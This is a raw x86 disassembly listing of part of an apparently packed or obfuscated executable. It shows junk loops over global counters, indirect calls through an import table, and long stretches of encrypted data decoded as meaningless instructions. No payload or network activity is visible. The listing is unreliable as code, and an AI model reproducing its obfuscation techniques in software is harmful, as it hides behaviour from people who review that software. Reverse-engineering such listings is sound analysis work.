  409b0b:	cmp    DWORD PTR ds:0x4336a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4336a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4336a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4336a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4336a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433717,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433697
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43372f
  409b70:	or     edi,DWORD PTR ds:0x43369f
  409b76:	mov    DWORD PTR ds:0x43372f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4336a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433773
  409b98:	and    edx,DWORD PTR ds:0x433657
  409b9e:	mov    DWORD PTR ds:0x433773,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4336af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4336af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4336af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4336af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4336af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4336af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4336af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4336af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4336a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4336a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4336a3,edi
  409c26:	cmp    DWORD PTR ds:0x4336a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4336a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43385d
  409c45:	push   0x433867
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   edi,DWORD PTR [ebp+0x6577acc0],0xca7c7cee
  409c85:	jns    0x409d03
  409c87:	jl     0x409c1d
  409c89:	fisttp WORD PTR [eax-0xd]
  409c8c:	pop    eax
  409c8d:	jp     0x409cee
  409c8f:	xchg   ecx,eax
  409c90:	jne    0x409c80
  409c92:	test   DWORD PTR [ebx],ebp
  409c94:	retf   
  409c95:	sbb    cl,BYTE PTR [ebx]
  409c97:	pop    ebp
  409c98:	rol    ecx,0xf7
  409c9b:	data16 rcr BYTE PTR [edi-0x553622f4],1
  409ca2:	stos   BYTE PTR es:[edi],al
  409ca3:	ins    BYTE PTR es:[edi],dx
  409ca4:	fadd   DWORD PTR ds:0x694e810a
  409caa:	leave  
  409cab:	and    ebp,DWORD PTR [ebp-0x4af787f0]
  409cb1:	mov    edx,0x6aa71a08
  409cb6:	fnstcw WORD PTR [ebx-0x77]
  409cb9:	push   0x54
  409cbb:	ffreep st(6)
  409cbd:	(bad)  
  409cbe:	mov    edi,fs
  409cc0:	inc    edx
  409cc1:	sbb    DWORD PTR [eax+0x3d],ebp
  409cc4:	mov    bl,BYTE PTR [esi+ebp*1]
  409cc7:	jle    0x409d44
  409cc9:	mov    esp,0x69ced975
  409cce:	add    al,0xa4
  409cd0:	sub    al,0xa2
  409cd2:	or     ebp,DWORD PTR [eax+0x1]
  409cd5:	std    
  409cd6:	and    eax,0x7f3a88fb
  409cdb:	or     esp,edx
  409cdd:	popf   
  409cde:	pop    esp
  409cdf:	cmp    eax,0x657d8026
  409ce4:	xchg   DWORD PTR [esi+0x74],edx
  409ce7:	dec    esi
  409ce8:	fchs   
  409cea:	cmp    cl,cl
  409cec:	(bad)  
  409ced:	cmp    edi,DWORD PTR [eax]
  409cef:	xor    bl,0xdf
  409cf2:	mov    ds:0xd796f0e4,al
  409cf7:	test   dl,al
  409cf9:	inc    edi
  409cfa:	cmp    dh,BYTE PTR [eax+0x5231afa5]
  409d00:	fscale 
  409d02:	and    al,0xd4
  409d04:	xor    bh,BYTE PTR [edi-0x34]
  409d07:	das    
  409d08:	ret    0xb681
  409d0b:	sbb    eax,DWORD PTR [ebx-0x386450e2]
  409d11:	(bad)  
  409d12:	dec    ebx
  409d13:	cwde   
  409d14:	or     eax,0xb433e628
  409d19:	js     0x409d35
  409d1b:	pop    eax
  409d1c:	stos   DWORD PTR es:[edi],eax
  409d1d:	aas    
  409d1e:	add    BYTE PTR [edx+edx*4],cl
  409d21:	mov    edx,0xd8cd1b3f
  409d26:	mov    ?,WORD PTR [edx-0x75]
  409d29:	std    
  409d2a:	mov    edx,0x36487734
  409d2f:	mov    al,0x7b
  409d31:	imul   ebx,esi,0xac2ed92d
  409d37:	ss sbb al,0x62
  409d3a:	xchg   ebp,eax
  409d3b:	adc    cl,al
  409d3d:	jmp    0xb7d58ad4
  409d42:	jne    0x409d30
  409d44:	ja     0x409d83
  409d46:	add    al,0x5b
  409d48:	and    BYTE PTR ds:0x5fbe2d4d,ch
  409d4e:	lds    ebp,FWORD PTR [ecx]
  409d50:	push   0x3
  409d52:	neg    DWORD PTR [ebx+0x71]
  409d55:	mov    eax,ds:0xc3415b24
  409d5a:	xchg   ebp,eax
  409d5b:	dec    ebp
  409d5c:	jge    0x79c37b3
  409d62:	jmp    0x21d5afe1
  409d67:	sub    ebx,DWORD PTR [eax-0x17607f97]
  409d6d:	mov    dh,0x89
  409d6f:	into   
  409d70:	aad    0x78
  409d72:	mov    ah,0xd3
  409d74:	push   esi
  409d75:	imul   ebx,DWORD PTR [ebx+0x54],0x11
  409d79:	jg     0x409d31
  409d7b:	in     eax,dx
  409d7c:	cmp    al,0x20
  409d7e:	push   esi
  409d7f:	jnp    0x409da4
  409d81:	push   cs
  409d82:	into   
  409d83:	mov    eax,0x8487a41c
  409d88:	mov    ecx,0x1042ec62
  409d8d:	jns    0x409d5c
  409d8f:	aaa    
  409d90:	cmp    ch,BYTE PTR [ebp-0x15]
  409d93:	lods   eax,DWORD PTR ds:[esi]
  409d94:	(bad)  
  409d95:	jmp    0x66bb:0x2fada00e
  409d9c:	aam    0x75
  409d9e:	jmp    0x10ba610d
  409da3:	sub    DWORD PTR [eax],edx
  409da5:	push   ecx
  409da6:	fimul  DWORD PTR ds:0xd10605d6
  409dac:	push   esp
  409dad:	stos   DWORD PTR es:[edi],eax
  409dae:	iret   
  409daf:	call   0x44bc:0x6344842e
  409db6:	sbb    ah,BYTE PTR [ecx-0x2a954493]
  409dbc:	cmc    
  409dbd:	int3   
  409dbe:	mov    ds:0xbb66711b,al
  409dc3:	mov    ds:0xc1ddbf,al
  409dc8:	sub    BYTE PTR [edx],0x40
  409dcb:	xchg   esi,esi
  409dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dce:	push   esp
  409dcf:	mov    ds:0xb76f4539,al
  409dd4:	and    DWORD PTR [edx+0x70],eax
  409dd7:	xor    edx,DWORD PTR [edx+0x758f2855]
  409ddd:	out    dx,al
  409dde:	pop    es
  409ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de0:	sbb    ah,bl
  409de2:	loop   0x409dae
  409de4:	imul   edi,DWORD PTR [si],0xa56f6bf0
  409deb:	js     0x409e51
  409ded:	(bad)  
  409dee:	sbb    BYTE PTR es:[edi+0x35eb9585],ch
  409df5:	sbb    DWORD PTR [edx],ecx
  409df7:	inc    esi
  409df8:	and    eax,0x9cd7dd46
  409dfd:	sub    BYTE PTR [ebx],bl
  409dff:	rol    BYTE PTR [eax+0x5b07af15],cl
  409e05:	into   
  409e06:	jle    0x409e1c
  409e08:	mov    ebx,0xc1d813c8
  409e0d:	xor    eax,0xa7b565db
  409e12:	adc    eax,0xd8fc83e4
  409e17:	mov    esi,esp
  409e19:	stc    
  409e1a:	mov    eax,0x7fad461
  409e1f:	ss das 
  409e21:	jmp    0x21bb:0x89bd9107
  409e28:	cmp    BYTE PTR [eax+edi*4-0x73],ch
  409e2c:	xor    ah,BYTE PTR [edi+0x7e]
  409e2f:	out    0x3b,al
  409e31:	add    ch,BYTE PTR [ebp+0x31f3b230]
  409e37:	xor    ch,al
  409e39:	out    0x4b,al
  409e3b:	cdq    
  409e3c:	and    bh,bh
  409e3e:	pop    ds
  409e3f:	(bad)
  409e43:	in     eax,dx
  409e44:	jmp    0x58b7:0xfe963592
  409e4b:	ja     0x409e9b
  409e4d:	mov    WORD PTR [ecx+0x4f],?
  409e50:	mov    eax,0x23939ea3
  409e55:	mov    ah,0x78
  409e57:	(bad)  
  409e58:	sbb    al,0x74
  409e5a:	sub    BYTE PTR [edi*1-0x58196eb3],dl
  409e61:	das    
  409e62:	mov    dl,0x24
  409e64:	call   FWORD PTR [edi]
  409e66:	sub    cl,bl
  409e68:	pop    edi
  409e69:	lods   al,BYTE PTR ds:[esi]
  409e6a:	and    eax,0x82c1fb5
  409e6f:	shrd   DWORD PTR [esi+0x20d2ba40],edi,cl
  409e76:	add    edi,DWORD PTR ds:0xe6fe3d55
  409e7c:	hlt    
  409e7d:	out    0x68,al
  409e7f:	xchg   BYTE PTR [ebx],dh
  409e81:	inc    esi
  409e82:	adc    BYTE PTR [ecx+0x2c9edd46],dh
  409e88:	adc    ebx,DWORD PTR [eax]
  409e8a:	sub    al,0x52
  409e8c:	mov    ds,WORD PTR [edi]
  409e8e:	mov    ebx,0x533e5c09
  409e93:	call   DWORD PTR [eax-0x6778005]
  409e99:	popf   
  409e9a:	ror    DWORD PTR cs:[eax-0x38],1
  409e9e:	xchg   ebx,eax
  409e9f:	fnstcw WORD PTR [ebx+0x41]
  409ea2:	dec    esi
  409ea3:	pop    ebx
  409ea4:	sub    eax,0x681c8db4
  409ea9:	pusha  
  409eaa:	mov    ds:0xe939174a,al
  409eaf:	push   edx
  409eb0:	pop    esi
  409eb1:	neg    BYTE PTR [ebp+0x4a]
  409eb4:	sub    al,0xe9
  409eb6:	add    BYTE PTR [eax-0x4a36fe80],0x70
  409ebd:	xchg   DWORD PTR [eax+esi*1-0x5b9009d],edi
  409ec4:	pop    ss
  409ec5:	ins    DWORD PTR es:[edi],dx
  409ec6:	and    eax,0x759af473
  409ecb:	test   BYTE PTR [ecx+0x6b],dh
  409ece:	jbe    0x409e75
  409ed0:	jne    0x409ef1
  409ed2:	pop    ds
  409ed3:	adc    BYTE PTR [esi+0x169afe32],al
  409ed9:	push   ebp
  409eda:	mov    esi,0xf90cc251
  409edf:	arpl   WORD PTR [esi-0x6e425730],bx
  409ee5:	mov    dl,0x1b
  409ee7:	mov    dl,0x6b
  409ee9:	aam    0xdc
  409eeb:	repnz ror BYTE PTR [ebx],cl
  409eee:	(bad)  
  409eef:	retf   
  409ef0:	retf   
  409ef1:	retf   0xe92a
  409ef4:	add    BYTE PTR [edx],bl
  409ef6:	push   ds
  409ef7:	jnp    0x409f03
  409ef9:	cld    
  409efa:	jne    0x409f49
  409efc:	pop    edx
  409efd:	into   
  409efe:	or     esi,DWORD PTR [edi+ebp*8-0x38]
  409f02:	dec    esp
  409f03:	push   0xc64885b4
  409f08:	pop    eax
  409f09:	lock and cl,BYTE PTR [ebx+esi*1]
  409f0d:	jecxz  0x409f6f
  409f0f:	imul   sp,dx,0x41
  409f13:	dec    esp
  409f14:	fnstcw WORD PTR [edi]
  409f16:	dec    ecx
  409f17:	lods   al,BYTE PTR ds:[esi]
  409f18:	clc    
  409f19:	out    dx,eax
  409f1a:	xchg   DWORD PTR [eax+0x69],eax
  409f1d:	inc    ebx
  409f1e:	mov    edi,0x46a42d6f
  409f23:	lea    esp,[eax-0x6e7499c6]
  409f29:	into   
  409f2a:	mov    dh,BYTE PTR [ecx]
  409f2c:	shl    BYTE PTR ss:[eax+0x751cf340],1
  409f33:	inc    DWORD PTR [eax]
  409f35:	cli    
  409f36:	pop    esi
  409f37:	paddsw mm2,QWORD PTR [esi]
  409f3a:	or     eax,0xd27c418a
  409f3f:	inc    eax
  409f40:	push   ds
  409f41:	mov    edi,0x415189ec
  409f46:	fldenv [edi]
  409f48:	pushf  
  409f49:	pop    ds
  409f4a:	dec    eax
  409f4b:	sub    BYTE PTR [eax-0x254ebddb],dl
  409f51:	test   al,0xe8
  409f53:	sbb    al,0x13
  409f55:	das    
  409f56:	mov    bl,0xa2
  409f58:	cmp    DWORD PTR [ecx],ebx
  409f5a:	jecxz  0x409f66
  409f5c:	repnz ins BYTE PTR es:[edi],dx
  409f5e:	pushf  
  409f5f:	lock cdq 
  409f61:	push   0x425a61a3
  409f66:	imul   ebp,edi,0x5b
  409f69:	rcr    DWORD PTR [esi+edx*8],1
  409f6c:	test   eax,0x252085c2
  409f71:	sbb    DWORD PTR [ecx],eax
  409f73:	sub    ch,BYTE PTR [ebx-0x3cd2c7ba]
  409f79:	mov    bh,0x9f
  409f7b:	sub    ah,BYTE PTR [ebp+0x3c157cab]
  409f81:	sahf   
  409f82:	arpl   WORD PTR [eax+0x56b73edf],dx
  409f88:	mov    al,ds:0x89e4f595
  409f8d:	xchg   edx,eax
  409f8e:	xor    DWORD PTR [ebx-0x3e86d407],edx
  409f94:	das    
  409f95:	daa    
  409f96:	(bad)  
  409f97:	cmp    eax,0x41db03a5
  409f9c:	lock in al,0x32
  409f9f:	es mov eax,0xc48b00ec
  409fa5:	imul   ebp,ecx,0xffffff8a
  409fa8:	jo     0x409f72
  409faa:	pop    esp
  409fab:	repz and BYTE PTR [ebp+0x5c6cfddc],0xe6
  409fb3:	sbb    edx,DWORD PTR [esi-0x46a849a4]
  409fb9:	pop    edi
  409fba:	stc    
  409fbb:	sbb    BYTE PTR [ebp+eiz*4-0x10],al
  409fbf:	xchg   ah,dl
  409fc1:	cmc    
  409fc2:	push   esp
  409fc3:	outs   dx,DWORD PTR ds:[esi]
  409fc4:	fsubr  st,st(5)
  409fc6:	xor    edi,edx
  409fc8:	xor    al,BYTE PTR [edx*8+0x329141e1]
  409fcf:	aam    0xc2
  409fd1:	mov    ebp,esp
  409fd3:	popa   
  409fd4:	sbb    BYTE PTR [ecx-0xb42ab4b],0x4b
  409fdb:	fsub   QWORD PTR [esi]
  409fdd:	lods   al,BYTE PTR ds:[esi]
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x433723,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x433723
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433723,edx
  40a001:	cmp    DWORD PTR ds:0x433723,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433723,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433773
  40a040:	adc    edx,DWORD PTR ds:0x43372b
  40a046:	mov    DWORD PTR ds:0x433773,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433657,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4336df
  40a075:	xor    DWORD PTR ds:0x4336b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433653,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43376b
  40a094:	xor    DWORD PTR ds:0x43375b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	(bad)  
  40a0ac:	fsub   QWORD PTR [ebp-0x7b]
  40a0af:	xor    ebp,edx
  40a0b1:	jl     0x40a12f
  40a0b3:	retf   0x7c79
  40a0b6:	jl     0x40a0f3
  40a0b8:	mov    dl,0x56
  40a0ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0bb:	sub    esp,DWORD PTR [esi-0x29]
  40a0be:	int3   
  40a0bf:	mov    eax,0xe91e6d7b
  40a0c4:	in     al,dx
  40a0c5:	iret   
  40a0c6:	pop    esp
  40a0c7:	jle    0x40a0a1
  40a0c9:	jbe    0x40a067
  40a0cb:	adc    al,0x2c
  40a0cd:	mov    al,ds:0xb3f02d7
  40a0d2:	rcr    BYTE PTR [edi],cl
  40a0d4:	sbb    ah,BYTE PTR [edx+ebp*4]
  40a0d7:	mov    edx,0xc8e961a8
  40a0dc:	sbb    DWORD PTR [edi-0x7a],edi
  40a0df:	xchg   BYTE PTR [esi],al
  40a0e1:	aaa    
  40a0e2:	mov    BYTE PTR [ebx],dh
  40a0e4:	mov    bl,0x31
  40a0e6:	adc    bl,BYTE PTR [ecx+0x53f2114e]
  40a0ec:	mov    esi,DWORD PTR [eax-0x38]
  40a0ef:	popf   
  40a0f0:	mov    esi,0x7644b46f
  40a0f5:	mov    DWORD PTR [ecx+0x19f0ef2c],ebp
  40a0fb:	pop    ebp
  40a0fc:	jle    0x40a0ad
  40a0fe:	(bad)  
  40a0ff:	mov    cl,al
  40a101:	pop    ebx
  40a102:	ret    
  40a103:	add    DWORD PTR [ebx+eiz*1+0x74],eax
  40a107:	sbb    DWORD PTR [esi-0x56],ebx
  40a10a:	xor    al,0x14
  40a10c:	aad    0x60
  40a10e:	(bad)  
  40a10f:	mov    eax,ds:0x2f8aa93f
  40a114:	cli    
  40a115:	scas   al,BYTE PTR es:[edi]
  40a116:	mov    eax,0xb867e3ad
  40a11b:	pop    ss
  40a11c:	imul   ebp,DWORD PTR [ebx-0x6b548981],0xef4dabb1
  40a126:	sbb    BYTE PTR [ebx+0x66cc9249],cl
  40a12c:	and    eax,0xa94bb22f
  40a131:	mov    ch,0xca
  40a133:	xor    BYTE PTR [edi-0x45],al
  40a136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a137:	jmp    0xda8a:0xbd42ecfc
  40a13e:	retf   0x8efb
  40a141:	xchg   ecx,eax
  40a142:	and    ebp,ebx
  40a144:	xchg   ebp,eax
  40a145:	aad    0xe6
  40a147:	xor    DWORD PTR [edi-0x726c8185],ecx
  40a14d:	loop   0x40a0fa
  40a14f:	mov    BYTE PTR [eax+0x51],cl
  40a152:	mov    ecx,0xbe286d24
  40a157:	inc    ebp
  40a158:	(bad)  
  40a159:	cmp    eax,0x25679985
  40a15e:	loope  0x40a130
  40a160:	fldenv [ebx]
  40a162:	push   esi
  40a163:	clc    
  40a164:	aas    
  40a165:	push   edi
  40a166:	sbb    al,0x6e
  40a168:	es jae 0x40a0f8
  40a16b:	xchg   edi,eax
  40a16c:	cwde   
  40a16d:	cdq    
  40a16e:	pop    ebp
  40a16f:	adc    al,0x1f
  40a171:	bnd call 0x6bd42725
  40a177:	mov    dl,ch
  40a179:	jne    0x40a151
  40a17b:	mov    esi,0x8f5e729c
  40a180:	sbb    ebp,DWORD PTR [eax]
  40a182:	arpl   WORD PTR [ecx+0x3808210e],dx
  40a188:	add    al,0x5b
  40a18a:	lods   al,BYTE PTR ds:[esi]
  40a18b:	data16 into 
  40a18d:	rcl    DWORD PTR [eax+0x1c],0xd4
  40a191:	(bad)  
  40a192:	jecxz  0x40a1cd
  40a194:	dec    eax
  40a195:	int3   
  40a196:	sub    DWORD PTR ds:0x7e4408ac,ecx
  40a19c:	xchg   edi,eax
  40a19d:	sti    
  40a19e:	aas    
  40a19f:	jge    0x40a187
  40a1a1:	xchg   ebp,eax
  40a1a2:	or     ah,BYTE PTR [esi+0x34]
  40a1a5:	cmp    edi,ecx
  40a1a7:	hlt    
  40a1a8:	dec    esi
  40a1a9:	lds    eax,FWORD PTR [ebx-0x57d43130]
  40a1af:	test   DWORD PTR [eax+ebp*4],ecx
  40a1b2:	xchg   al,cl
  40a1b4:	lahf   
  40a1b5:	bound  ebp,QWORD PTR [ebx]
  40a1b7:	cmp    DWORD PTR [edx],esp
  40a1b9:	sub    ebx,0x60
  40a1bc:	jecxz  0x40a149
  40a1be:	push   eax
  40a1bf:	sbb    BYTE PTR [eax+0xd],dh
  40a1c2:	adc    DWORD PTR [esi+0x54],esi
  40a1c5:	pop    esp
  40a1c6:	lahf   
  40a1c7:	xchg   BYTE PTR [eax+esi*2],cl
  40a1ca:	imul   esp,DWORD PTR [eax-0x623d0488],0xffffff84
  40a1d1:	fmulp  st(6),st
  40a1d3:	add    DWORD PTR ds:0xee2c0485,esi
  40a1d9:	xor    al,0x42
  40a1db:	xor    DWORD PTR [edx-0x67],ebx
  40a1de:	xlat   BYTE PTR ds:[ebx]
  40a1df:	(bad)  
  40a1e0:	and    dl,BYTE PTR [edi]
  40a1e2:	inc    esp
  40a1e3:	pop    eax
  40a1e4:	leave  
  40a1e5:	inc    edx
  40a1e6:	icebp  
  40a1e7:	push   eax
  40a1e8:	pop    es
  40a1e9:	data16 aaa 
  40a1eb:	nop
  40a1ec:	imul   edx
  40a1ee:	xor    DWORD PTR [esp+esi*2],edi
  40a1f1:	stos   BYTE PTR es:[edi],al
  40a1f2:	cmp    BYTE PTR [ebx+0x42],0xd8
  40a1f6:	lods   eax,DWORD PTR ds:[esi]
  40a1f7:	leave  
  40a1f8:	sbb    ebp,DWORD PTR [ecx]
  40a1fa:	jp     0x40a197
  40a1fc:	hlt    
  40a1fd:	mov    ebp,0x764ca598
  40a202:	mov    dh,0x4f
  40a204:	ins    BYTE PTR es:[edi],dx
  40a205:	push   ds
  40a206:	xchg   ecx,eax
  40a207:	add    DWORD PTR [ecx],esi
  40a209:	inc    esi
  40a20a:	push   esp
  40a20b:	leave  
  40a20c:	clc    
  40a20d:	neg    BYTE PTR [ebx-0x8]
  40a210:	sub    eax,0xd5bb0939
  40a215:	sbb    al,0x7f
  40a217:	(bad)  
  40a218:	ficom  DWORD PTR [esi+0x1e8eb96f]
  40a21e:	sbb    eax,0xfdc73fc7
  40a223:	xchg   edi,eax
  40a224:	sub    edi,DWORD PTR [esi]
  40a226:	add    al,0x79
  40a228:	ror    dl,0x37
  40a22b:	jmp    0xfb9c1f82
  40a230:	shl    cl,1
  40a232:	lock add dl,bh
  40a235:	jns    0x40a263
  40a237:	sahf   
  40a238:	js     0x40a26e
  40a23a:	push   esp
  40a23b:	leave  
  40a23c:	leave  
  40a23d:	fcomi  st,st(7)
  40a23f:	(bad)  
  40a240:	in     eax,0x1a
  40a242:	or     eax,0xa8c8fb0d
  40a247:	cmp    BYTE PTR [ebx-0x2181961f],cl
  40a24d:	pop    eax
  40a24e:	cld    
  40a24f:	and    al,0x8f
  40a251:	mov    ebx,0xe7426181
  40a256:	stos   DWORD PTR es:[edi],eax
  40a257:	ror    BYTE PTR ds:0xddf77577,1
  40a25d:	daa    
  40a25e:	sub    eax,0x1cc99bd9
  40a263:	not    al
  40a265:	sub    bl,BYTE PTR [ebx+0x1c023bdc]
  40a26b:	sub    eax,0x426d2f49
  40a270:	inc    esp
  40a271:	leave  
  40a272:	or     BYTE PTR [esp],0x80
  40a276:	ret    
  40a277:	xlat   BYTE PTR ds:[ebx]
  40a278:	cmp    DWORD PTR [ebp+0xc],ebx
  40a27b:	and    BYTE PTR [edi+0x754a4450],0x7f
  40a282:	inc    ebp
  40a283:	in     al,dx
  40a284:	in     al,0xb4
  40a286:	popf   
  40a287:	or     eax,0x3abd1939
  40a28c:	push   edx
  40a28d:	les    edi,FWORD PTR [eax]
  40a28f:	ins    BYTE PTR es:[edi],dx
  40a290:	jno    0x40a250
  40a292:	jecxz  0x40a26c
  40a294:	add    bl,dh
  40a296:	ret    0x6e5
  40a299:	xor    BYTE PTR [ebx+0x68],bh
  40a29c:	inc    DWORD PTR [eax+ecx*1-0x6]
  40a2a0:	xchg   BYTE PTR [edx+0x7a0f9b82],bh
  40a2a6:	hlt    
  40a2a7:	loopne 0x40a2ec
  40a2a9:	or     al,0x56
  40a2ab:	test   BYTE PTR [eax+0x478d9db2],al
  40a2b1:	and    ah,BYTE PTR [esi]
  40a2b3:	dec    eax
  40a2b4:	mov    BYTE PTR [ecx+0x30923409],ch
  40a2ba:	cli    
  40a2bb:	pop    ss
  40a2bc:	loop   0x40a2a6
  40a2be:	xchg   BYTE PTR [edx+0x64612db2],bl
  40a2c4:	not    BYTE PTR [ebx]
  40a2c6:	das    
  40a2c7:	into   
  40a2c8:	xchg   edx,eax
  40a2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2ca:	adc    DWORD PTR [esi+0x7c],0x2
  40a2ce:	xchg   esp,eax
  40a2cf:	stos   BYTE PTR es:[edi],al
  40a2d0:	ds jg  0x40a27a
  40a2d3:	clc    
  40a2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d5:	cmp    BYTE PTR gs:[esi],0x9e
  40a2d9:	aaa    
  40a2da:	lahf   
  40a2db:	xor    dh,BYTE PTR [ecx+0x2d2b3879]
  40a2e1:	inc    eax
  40a2e2:	dec    esp
  40a2e3:	mov    dl,0x66
  40a2e5:	or     eax,0x124787f4
  40a2ea:	adc    BYTE PTR [esi-0x1b],bl
  40a2ed:	sbb    ch,BYTE PTR [edi]
  40a2ef:	mov    dl,0xe4
  40a2f1:	sub    dl,cl
  40a2f3:	push   es
  40a2f4:	lea    edi,[ecx+0x7bed99a8]
  40a2fa:	sbb    dl,BYTE PTR [ebx]
  40a2fc:	int3   
  40a2fd:	stos   BYTE PTR es:[edi],al
  40a2fe:	adc    al,0xb4
  40a300:	jae    0x40a322
  40a302:	in     al,0x78
  40a304:	lds    edx,FWORD PTR [ecx-0x65]
  40a307:	fs pop esp
  40a309:	fistp  QWORD PTR [eax]
  40a30b:	mov    eax,ds:0xc1f339ad
  40a310:	adc    al,0x40
  40a312:	or     al,0x35
  40a314:	je     0x40a393
  40a316:	push   ebx
  40a317:	icebp  
  40a318:	or     DWORD PTR [ebx-0x76],0x743ff3f6
  40a31f:	iret   
  40a320:	loope  0x40a392
  40a322:	adc    edx,esp
  40a324:	sbb    BYTE PTR [edi+0x6e],0x89
  40a328:	aam    0x17
  40a32a:	popa   
  40a32b:	shl    cl,0x6c
  40a32e:	lahf   
  40a32f:	mov    esp,DWORD PTR [ebx-0x4a]
  40a332:	aad    0x73
  40a334:	xor    ah,BYTE PTR [eax]
  40a336:	mov    DWORD PTR [ebp-0x5a],edx
  40a339:	outs   dx,BYTE PTR ds:[esi]
  40a33a:	and    al,dh
  40a33c:	aaa    
  40a33d:	cdq    
  40a33e:	mov    ebp,0x21ea1a60
  40a343:	or     DWORD PTR [edx],esi
  40a345:	mov    bl,0x37
  40a347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a348:	and    ebp,ecx
  40a34a:	rcl    DWORD PTR [eax-0x2209b893],cl
  40a350:	into   
  40a351:	or     DWORD PTR [eax-0x7b],esi
  40a354:	sub    BYTE PTR [edi-0x1e],cl
  40a357:	fs mov ebx,ebx
  40a35a:	into   
  40a35b:	(bad)  
  40a35c:	push   0xffffff85
  40a35e:	jne    0x40a3cd
  40a360:	rol    DWORD PTR [ebp-0x2ccc6168],0x3b
  40a367:	shl    esp,0xec
  40a36a:	fimul  WORD PTR [eax-0xf81956f]
  40a370:	xor    DWORD PTR [eax+edi*4+0xf8909be],ebp
  40a377:	jo     0x40a318
  40a379:	pushf  
  40a37a:	jb     0x40a323
  40a37c:	cmp    al,0xce
  40a37e:	loope  0x40a34e
  40a380:	call   DWORD PTR cs:[esi-0x1dadc7e2]
  40a387:	dec    edx
  40a388:	xor    eax,0x48cb8cae
  40a38d:	into   
  40a38e:	xor    eax,0xaeab3063
  40a393:	lods   al,BYTE PTR ds:[si]
  40a395:	add    eax,edx
  40a397:	das    
  40a398:	fdiv   DWORD PTR [esi]
  40a39a:	add    eax,0x769628a1
  40a39f:	jae    0x40a3a3
  40a3a1:	cmc    
  40a3a2:	clc    
  40a3a3:	pusha  
  40a3a4:	push   ecx
  40a3a5:	dec    edx
